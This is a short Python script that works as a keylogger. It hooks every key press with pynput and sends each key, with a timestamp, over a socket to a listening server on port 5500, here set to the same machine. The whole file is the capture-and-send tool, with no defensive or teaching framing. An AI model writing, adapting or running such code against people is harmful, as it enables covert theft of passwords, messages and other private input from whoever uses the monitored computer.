from pynput import keyboard
import logging
import time
import socket


host = socket.gethostname()  # as both code is running on same pc
port = 5500  # socket server port number

client_socket = socket.socket()  # instantiate
client_socket.connect((host, port))  # connect to the server
timer="( "+time.strftime("%D %H:%M:%S")+" ) "
print("---  ---")

def on_press(key):
    try:
        message=timer+"Press : "+ str(key)
        client_socket.send(message.encode())
    except AttributeError:
        client_socket.send(message.encode())

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

client_socket.close()  # close the connection